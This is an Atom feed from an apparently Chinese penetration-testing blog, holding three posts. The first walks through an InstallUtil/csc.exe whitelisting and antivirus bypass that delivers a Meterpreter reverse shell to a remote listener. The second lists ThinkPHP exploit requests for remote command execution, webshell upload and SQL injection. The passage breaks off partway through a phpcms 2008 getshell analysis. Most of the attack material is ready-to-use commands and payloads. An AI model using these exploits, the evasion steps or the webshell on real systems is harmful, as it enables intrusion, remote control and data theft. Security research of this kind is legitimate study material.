<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>j2ekim&#39;s Blog</title>
  
  <subtitle>努力改变，从未放弃。</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://j2ekim.github.io/"/>
  <updated>2019-07-23T08:11:00.051Z</updated>
  <id>https://j2ekim.github.io/</id>
  
  <author>
    <name>J2ekim</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>InstallUtil&amp;csc.exe-bypass application whitelisting</title>
    <link href="https://j2ekim.github.io/2019/03/27/InstallUtil&amp;csc.exe-bypass%20application%20whitelisting/"/>
    <id>https://j2ekim.github.io/2019/03/27/InstallUtil&amp;csc.exe-bypass application whitelisting/</id>
    <published>2019-03-27T03:53:14.000Z</published>
    <updated>2019-07-23T08:11:00.051Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-通过msfvenom生成C＃的shellcode"><a href="#1-通过msfvenom生成C＃的shellcode" class="headerlink" title="1.通过msfvenom生成C＃的shellcode"></a>1.通过msfvenom生成C＃的shellcode</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=1.1.1.1 lport=4443 -f csharp</span><br></pre></td></tr></table></figure><p><img src="\img\bypass_uac\1.png"></p><h2 id="2-下载InstallUtil-Shellcode-cs，将上面生成的shellcode复制到该cs文件中"><a href="#2-下载InstallUtil-Shellcode-cs，将上面生成的shellcode复制到该cs文件中" class="headerlink" title="2.下载InstallUtil-Shellcode.cs，将上面生成的shellcode复制到该cs文件中"></a>2.下载InstallUtil-Shellcode.cs，将上面生成的shellcode复制到该cs文件中</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://gist.github.com/lithackr/b692378825e15bfad42f78756a5a3260</span><br><span class="line">InstallUtil-Shellcode-cs</span><br></pre></td></tr></table></figure><h2 id="3-csc编译InstallUtil-ShellCode-cs"><a href="#3-csc编译InstallUtil-ShellCode-cs" class="headerlink" title="3.csc编译InstallUtil-ShellCode.cs"></a>3.csc编译InstallUtil-ShellCode.cs</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /unsafe /platform:x86 /out:D:\test\InstallUtil-shell.exe D:\test\InstallUtil-ShellCode.cs</span><br></pre></td></tr></table></figure><p>编译生成的文件后缀名无所谓exe dll txt都可以，但只能InstallUtil.exe来触发<br><img src="\img\bypass_uac\2.png"></p><h2 id="4-InstallUtil-exe执行-反弹shell"><a href="#4-InstallUtil-exe执行-反弹shell" class="headerlink" title="4.InstallUtil.exe执行 反弹shell"></a>4.InstallUtil.exe执行 反弹shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U D:\test\InstallUtil-shell.exe</span><br></pre></td></tr></table></figure><p><img src="\img\bypass_uac\3.png"><br>成功bypass av，反弹shell：<br><img src="\img\bypass_uac\4.png"></p><h2 id="补充：MSF开启监听"><a href="#补充：MSF开启监听" class="headerlink" title="补充：MSF开启监听"></a>补充：MSF开启监听</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 172.16.0.19</span><br><span class="line">set LPORT 4443</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h3><p><a href="https://www.blackhillsinfosec.com/how-to-bypass-application-whitelisting-av/" target="_blank" rel="noopener">https://www.blackhillsinfosec.com/how-to-bypass-application-whitelisting-av/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1-通过msfvenom生成C＃的shellcode&quot;&gt;&lt;a href=&quot;#1-通过msfvenom生成C＃的shellcode&quot; class=&quot;headerlink&quot; title=&quot;1.通过msfvenom生成C＃的shellcode&quot;&gt;&lt;/a&gt;1.通过msfv
      
    
    </summary>
    
      <category term="Web安全" scheme="https://j2ekim.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="渗透测试" scheme="https://j2ekim.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP典型漏洞总结</title>
    <link href="https://j2ekim.github.io/2019/01/21/ThinkPHP%E5%85%B8%E5%9E%8B%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>https://j2ekim.github.io/2019/01/21/ThinkPHP典型漏洞总结/</id>
    <published>2019-01-21T03:22:10.000Z</published>
    <updated>2019-07-23T08:10:04.096Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-ThinkPHP-5-0-x-Request类远程命令执行【20190111】"><a href="#1-ThinkPHP-5-0-x-Request类远程命令执行【20190111】" class="headerlink" title="1) ThinkPHP 5.0.x Request类远程命令执行【20190111】"></a>1) ThinkPHP 5.0.x Request类远程命令执行【20190111】</h1><p>受影响版本：<br>ThinkPHP 5.0.0 - ThinkPHP 5.0.23</p><p>在ThinkPHP 5.0.x 版本下，由于Request类的method 函数控制松散，导致可以通<br>过变量覆盖实现对任意函数进行调用，并且$_POST 将作为函数的参数传入，最终通过filterValue() 方法中的回调函数call_user_func()触发漏洞，实现远程命令执行</p><h2 id="ThinkPHP-5-0-15-POC"><a href="#ThinkPHP-5-0-15-POC" class="headerlink" title="ThinkPHP 5.0.15 POC"></a>ThinkPHP 5.0.15 POC</h2><p>下面POC 只有当debug模式开启时才可成功执行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /thinkphp5015/<span class="keyword">public</span>/index.php HTTP/<span class="number">1.1</span></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;mytest=whoami</span><br></pre></td></tr></table></figure></p><h2 id="ThinkPHP-5-0-23-POC"><a href="#ThinkPHP-5-0-23-POC" class="headerlink" title="ThinkPHP 5.0.23 POC"></a>ThinkPHP 5.0.23 POC</h2><p>下面POC 在debug模式无论关闭或开启均可成功执行<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/thinkphp5023/public/index.php?s=captcha</span> HTTP/1.1</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure></p><p>下面POC 只有当debug模式开启时才可成功执行<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/thinkphp5023/public/index.php?s=captcha</span> HTTP/1.1</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure></p><h2 id="2-ThinkPHP-5-x-controller远程命令执行【20181209】"><a href="#2-ThinkPHP-5-x-controller远程命令执行【20181209】" class="headerlink" title="2) ThinkPHP 5.x controller远程命令执行【20181209】"></a>2) ThinkPHP 5.x controller远程命令执行【20181209】</h2><p>受影响版本：<br>ThinkPHP 5.1.x ~ 5.1.31<br>ThinkPHP 5.0.x ~ 5.0.23</p><p>由于框架对于controller控制器名称没有做到足够的检测，导致在使用Pathinfo访问模式（没有开启强制路由）的情况下，造成可能的GetShell</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>在debug模式无论关闭或开启均可成功执行<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">执行phpinfo</span><br><span class="line">http://127.0.0.1/thinkphp5015//public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line">执行系统命令</span><br><span class="line">http://127.0.0.1/thinkphp5015/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line">写info.php文件</span><br><span class="line">http://127.0.0.1/thinkphp5015/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=info.php&amp;vars[1][]=%3C?php%20phpinfo();?%3E</span><br><span class="line"><span class="attribute">http://127.0.0.1/thinkphp5015/public/info.php</span></span><br><span class="line"><span class="attribute">写一句话木马</span></span><br><span class="line">http://127.0.0.1/thinkphp5015/public/index.php/?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=www2.php&amp;vars[1][]=&lt;?php @ev[xxx]al($_POST['123']);?&gt;</span><br></pre></td></tr></table></figure></p><h2 id="3-ThinkPHP-3-1、3-2-SQL注入-exp表达式-【20141211】"><a href="#3-ThinkPHP-3-1、3-2-SQL注入-exp表达式-【20141211】" class="headerlink" title="3) ThinkPHP 3.1、3.2 SQL注入(exp表达式)【20141211】"></a>3) ThinkPHP 3.1、3.2 SQL注入(exp表达式)【20141211】</h2><p>如果where语句的条件是数组，而且数组的第一个值是’exp’，那么第二个值就可以直接写SQL语句。这个特性在thinkphp3.1、3.2版本中均存在，通用性比较广。<br>I方法使用filter_exp函数过滤，是在exp后面会加个空格<br>但是filter_exp在I函数的fiter之前，所以如果开发者这样写I(‘get.school’, ‘’, ‘trim’)，那么会直接清除掉exp后面的空格，导致过滤无效。而这个写法是很普遍的。</p><h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://***.***.***.***/home/index/login</span></span><br><span class="line"><span class="attribute">POST提交</span></span><br><span class="line">uname[0]=exp&amp;uname[1]=%21%3D1 and 1=(updatexml(1,concat(0x5e24,(select user()),0x5e24),1))%23&amp;upwd=admin</span><br></pre></td></tr></table></figure><h2 id="4-ThinkPHP-5-0-9-信息泄露-SQL注入-in-【20170703】"><a href="#4-ThinkPHP-5-0-9-信息泄露-SQL注入-in-【20170703】" class="headerlink" title="4) ThinkPHP 5.0.9 信息泄露+SQL注入(in)【20170703】"></a>4) ThinkPHP 5.0.9 信息泄露+SQL注入(in)【20170703】</h2><p>ThinkPHP 5.0.9默认依旧是开放debug模式 (‘app_debug’ =&gt; true,)<br>触发该漏洞的关键词有：in 、not in<br>位置：select()、delete()、update()</p><h3 id="漏洞测试代码："><a href="#漏洞测试代码：" class="headerlink" title="漏洞测试代码："></a>漏洞测试代码：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">thinkphp509\application\index\controller\Index.php</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sqlvul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $ids = input(<span class="string">'ids/a'</span>);  <span class="comment">// /a 表示参数ids取值的规则是通过数组的形式来获取</span></span><br><span class="line">    $t = <span class="keyword">new</span> User();</span><br><span class="line">    $result = $t-&gt;where(<span class="string">'id'</span>, <span class="string">'in'</span>, $ids)-&gt;select();</span><br><span class="line">    <span class="comment">//$result = $t-&gt;where('id', 'not in', $ids)-&gt;select();</span></span><br><span class="line">    <span class="comment">//$result = $t-&gt;where('id', 'in', $ids)-&gt;delete();</span></span><br><span class="line">    <span class="comment">//$result = $t-&gt; update(['username' =&gt; 'thinkphp','id'=&gt;['in',$ids]]);;</span></span><br><span class="line">    <span class="keyword">foreach</span>($result <span class="keyword">as</span> $row) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Hello, &#123;$row['username']&#125;&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">thinkphp509\application\index\model\User.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $table = <span class="string">'user'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常请求：<br><a href="http://127.0.0.1/thinkphp509/public/index.php/index/index/sqlvul?ids=1" target="_blank" rel="noopener">http://127.0.0.1/thinkphp509/public/index.php/index/index/sqlvul?ids=1</a><br><a href="http://127.0.0.1/thinkphp509/public/index.php/index/index/sqlvul?ids[]=1&amp;ids[]=2" target="_blank" rel="noopener">http://127.0.0.1/thinkphp509/public/index.php/index/index/sqlvul?ids[]=1&amp;ids[]=2</a></p><h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp509/public/index.php/index/index/sqlvul?ids[0,updatexml(0,concat(0xa,user()),0)]=1</span><br><span class="line">&lt;img src="/img/thinkphp_getshell/ThinkPHP_1.png"&gt;</span><br></pre></td></tr></table></figure><h2 id="5-ThinkPHP-lt-5-0-16-update-insert-注入-inc-【20180409】"><a href="#5-ThinkPHP-lt-5-0-16-update-insert-注入-inc-【20180409】" class="headerlink" title="5) ThinkPHP &lt;5.0.16 update/insert 注入(inc)【20180409】"></a>5) ThinkPHP &lt;5.0.16 update/insert 注入(inc)【20180409】</h2><h3 id="测试准备"><a href="#测试准备" class="headerlink" title="测试准备"></a>测试准备</h3><p>1）修改数据库配置信息 application/database.php<br>在 application/config.php 中打开调试和trace，app_debug和app_trace均为true。说明：app_debug设置为true是必须的，app_trace可不设<br>2）创建数据库为tptest，表名为user，其中有两个字段id和username<br>3）在 application/index/controller/Index.php 中Index类中添加方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">sqlvul</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = input(<span class="string">'get.username/a'</span>);</span><br><span class="line">        <span class="comment">//db('user')-&gt;where(['id'=&gt; 5])-&gt;insert(['username'=&gt;$username]);</span></span><br><span class="line">db(<span class="string">'user'</span>)-&gt;where([<span class="string">'id'</span>=&gt; <span class="number">3</span>])-&gt;update([<span class="string">'username'</span>=&gt;$username]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><h3 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp5015/public/index.php/index/index/sqlvul?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1</span><br><span class="line">http://127.0.0.1/thinkphp5015/public/index.php/index/index/sqlvul?username[0]=dec&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1</span><br><span class="line">或者</span><br><span class="line">http://127.0.0.1/thinkphp5015/public/index.php/index/index/sqlvul?username[0]=inc&amp;username[1]=exp(~(select * from(select user())a))&amp;username[2]=1</span><br></pre></td></tr></table></figure><p><img src="/img/thinkphp_getshell/ThinkPHP_2.png"></p><h2 id="6-Thinkphp3-2-3-update注入-bind-【20180414】"><a href="#6-Thinkphp3-2-3-update注入-bind-【20180414】" class="headerlink" title="6) Thinkphp3.2.3 update注入(bind)【20180414】"></a>6) Thinkphp3.2.3 update注入(bind)【20180414】</h2><p>Thinkphp3.2.3是目前使用最广泛的thinkphp版本，虽然已经停止新功能的开发，但是应用的还是挺多</p><p>漏洞测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sqlvul3</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $User = M(<span class="string">"user"</span>);</span><br><span class="line">        $user[<span class="string">'id'</span>] = I(<span class="string">'id'</span>);</span><br><span class="line">        $data[<span class="string">'username'</span>] = I(<span class="string">'username'</span>);</span><br><span class="line">        $data[<span class="string">'password'</span>] = I(<span class="string">'password'</span>);</span><br><span class="line">        $valu = $User-&gt;where($user)-&gt;save($data);</span><br><span class="line">        var_dump($valu);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>正常请求：（更新用户密码）<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp323/index.php/Home/Index/sqlvul3?username=admin&amp;password=123&amp;id=1</span><br></pre></td></tr></table></figure></p><h2 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp323/index.php/Home/Index/sqlvul3?username=admin&amp;password=123&amp;&amp;id[0]=bind&amp;id[1]=0 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br></pre></td></tr></table></figure><p><img src="/img/thinkphp_getshell/ThinkPHP_3.png"></p><h2 id="7-Thinkphp3-2-3-find-select-delete注入【20180823】"><a href="#7-Thinkphp3-2-3-find-select-delete注入【20180823】" class="headerlink" title="7) Thinkphp3.2.3 find/select/delete注入【20180823】"></a>7) Thinkphp3.2.3 find/select/delete注入【20180823】</h2><h3 id="漏洞测试代码：-1"><a href="#漏洞测试代码：-1" class="headerlink" title="漏洞测试代码："></a>漏洞测试代码：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sqlvul1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      $res = M(<span class="string">'user'</span>)-&gt;find(I(<span class="string">'GET.id'</span>));</span><br><span class="line">      <span class="comment">//$res = M('user')-&gt;delete(I('GET.id'));</span></span><br><span class="line">      <span class="comment">//$res = M('user')-&gt;select(I('GET.id'));</span></span><br><span class="line">      var_dump($res);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>正常请求：<br><a href="http://127.0.0.1/thinkphp323/index.php?m=Home&amp;c=Index&amp;a=sqlvul1&amp;id=2" target="_blank" rel="noopener">http://127.0.0.1/thinkphp323/index.php?m=Home&amp;c=Index&amp;a=sqlvul1&amp;id=2</a></p><h3 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp323/index.php?m=Home&amp;c=Index&amp;a=sqlvul1&amp;id[alias]=where 1 and updatexml(1,concat(0x7e,user(),0x7e),1)--</span><br><span class="line">http://127.0.0.1/thinkphp323/index.php?m=Home&amp;c=Index&amp;a=sqlvul1&amp;id[where]=1 and updatexml(1,concat(0x7e,user(),0x7e),1)--</span><br><span class="line">http://127.0.0.1/thinkphp323/index.php?m=Home&amp;c=Index&amp;a=sqlvul1&amp;id[table]=user where 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- #需要知道表明 这里表名的user</span><br></pre></td></tr></table></figure><p><img src="/img/thinkphp_getshell/ThinkPHP_4.png"></p><h2 id="8-ThinkPHP-3-2-3-5-1-22-order-by注入【20180902】"><a href="#8-ThinkPHP-3-2-3-5-1-22-order-by注入【20180902】" class="headerlink" title="8) ThinkPHP 3.2.3/5.1.22 order by注入【20180902】"></a>8) ThinkPHP 3.2.3/5.1.22 order by注入【20180902】</h2><p>ThinkPHP在处理order by排序时，当排序参数可控且为关联数组(key-value)时，由于框架未对数组中key值作安全过滤处理，攻击者可利用key构造SQL语句进行注入，该漏洞影响ThinkPHP 3.2.3、5.1.22及以下版本。【CVE-2018-16385】</p><h3 id="ThinkPHP3-2-3漏洞测试代码："><a href="#ThinkPHP3-2-3漏洞测试代码：" class="headerlink" title="ThinkPHP3.2.3漏洞测试代码："></a>ThinkPHP3.2.3漏洞测试代码：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sqlvul2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $data=<span class="keyword">array</span>();</span><br><span class="line">    $data[<span class="string">'username'</span>]=<span class="keyword">array</span>(<span class="string">'eq'</span>,<span class="string">'qq123'</span>);</span><br><span class="line">    $order=I(<span class="string">'get.order'</span>);<span class="comment">//使用标准的I函数进行安全过滤</span></span><br><span class="line">    $m=M(<span class="string">'user'</span>)-&gt;where($data)-&gt;order($order)-&gt;find();</span><br><span class="line">    var_dump($m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ThinkPHP3-2-3-POC"><a href="#ThinkPHP3-2-3-POC" class="headerlink" title="ThinkPHP3.2.3 POC"></a>ThinkPHP3.2.3 POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp323/index.php?m=Home&amp;c=Index&amp;a=sqlvul2&amp;order[updatexml(1,concat(0x3a,user()),1)]</span><br><span class="line">http://127.0.0.1/thinkphp323/index.php/Home/Index/sqlvul2?order[updatexml(1,concat(0x3a,user()),1)]</span><br></pre></td></tr></table></figure><p><img src="/img/thinkphp_getshell/ThinkPHP_5.png"></p><h3 id="ThinkPHP5-1-22漏洞测试代码"><a href="#ThinkPHP5-1-22漏洞测试代码" class="headerlink" title="ThinkPHP5.1.22漏洞测试代码"></a>ThinkPHP5.1.22漏洞测试代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$data=<span class="keyword">array</span>();</span><br><span class="line">$data[<span class="string">'username'</span>]=<span class="keyword">array</span>(<span class="string">'eq'</span>,<span class="string">'admin'</span>);</span><br><span class="line">$order=input(<span class="string">'get.order'</span>);<span class="comment">//使用input函数进行安全过滤</span></span><br><span class="line">$m=db(<span class="string">'user'</span>)-&gt;where($data)-&gt;order($order)-&gt;find();</span><br><span class="line">dump($m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ThinkPHP5-1-22-POC"><a href="#ThinkPHP5-1-22-POC" class="headerlink" title="ThinkPHP5.1.22 POC"></a>ThinkPHP5.1.22 POC</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/tp5/public/index/index/test/index?order[id`|updatexml(1,concat(0x3a,user()),1)%23]=1</span><br></pre></td></tr></table></figure><p>参考:</p><p><a href="http://www.lsablog.com/networksec/penetration/thinkphp5-rce-analysis/" target="_blank" rel="noopener">www.lsablog.com/networksec/penetration/thinkphp5-rce-analysis/</a><br><a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2014-086737.html" target="_blank" rel="noopener">wooyun.jozxing.cc/static/bugs/wooyun-2014-086737.html</a><br><a href="https://xz.aliyun.com/t/125" target="_blank" rel="noopener"> xz.aliyun.com/t/125<br><a href="https://xz.aliyun.com/t/2631" target="_blank" rel="noopener">xz.aliyun.com/t/2631<br><a href="https://xz.aliyun.com/t/2257" target="_blank" rel="noopener">xz.aliyun.com/t/2257<br><a href="https://xz.aliyun.com/t/2812" target="_blank" rel="noopener">xz.aliyun.com/t/2812<br><a href="https://www.anquanke.com/post/id/104847" target="_blank" rel="noopener">www.anquanke.com/post/id/104847<br><a href="https://www.freebuf.com/vuls/185420.html" target="_blank" rel="noopener">www.freebuf.com/vuls/185420.html</a></a></a></a></a></a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;1-ThinkPHP-5-0-x-Request类远程命令执行【20190111】&quot;&gt;&lt;a href=&quot;#1-ThinkPHP-5-0-x-Request类远程命令执行【20190111】&quot; class=&quot;headerlink&quot; title=&quot;1) ThinkPH
      
    
    </summary>
    
      <category term="Web安全" scheme="https://j2ekim.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Exploit" scheme="https://j2ekim.github.io/categories/Web%E5%AE%89%E5%85%A8/Exploit/"/>
    
    
      <category term="PHP" scheme="https://j2ekim.github.io/tags/PHP/"/>
    
      <category term="Exploit" scheme="https://j2ekim.github.io/tags/Exploit/"/>
    
      <category term="getshell" scheme="https://j2ekim.github.io/tags/getshell/"/>
    
  </entry>
  
  <entry>
    <title>phpcms 2008 type.php 前台代码注入getshell漏洞分析</title>
    <link href="https://j2ekim.github.io/2018/11/29/phpcms_2008_type_php-getshell/"/>
    <id>https://j2ekim.github.io/2018/11/29/phpcms_2008_type_php-getshell/</id>
    <published>2018-11-29T01:24:48.000Z</published>
    <updated>2019-07-22T07:51:06.596Z</updated>
    
    <content type="html"><![CDATA[<p>phpcms 2008 type.php 前台代码注入getshell漏洞分析<br><a id="more"></a></p><p>tpye.php中:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">require</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">'/include/common.inc.php'</span>;</span><br><span class="line">...</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">empty</span>($template)) $template = <span class="string">'type'</span>;</span><br><span class="line">...</span><br><span class="line"> <span class="keyword">include</span> template(<span class="string">'phpcms'</span>, $template);</span><br><span class="line">...</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>先看一下<em>require</em>进来的<em>include/common.inc.php</em>，在这个文件第58行中存在如下代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_REQUEST)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(MAGIC_QUOTES_GPC)</span><br><span class="line">    &#123;</span><br><span class="line">        $_REQUEST = new_stripslashes($_REQUEST);</span><br><span class="line">        <span class="keyword">if</span>($_COOKIE) $_COOKIE = new_stripslashes($_COOKIE);</span><br><span class="line">        extract($db-&gt;escape($_REQUEST), EXTR_SKIP);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $_POST = $db-&gt;escape($_POST);</span><br><span class="line">        $_GET = $db-&gt;escape($_GET);</span><br><span class="line">        $_COOKIE = $db-&gt;escape($_COOKIE);</span><br><span class="line">      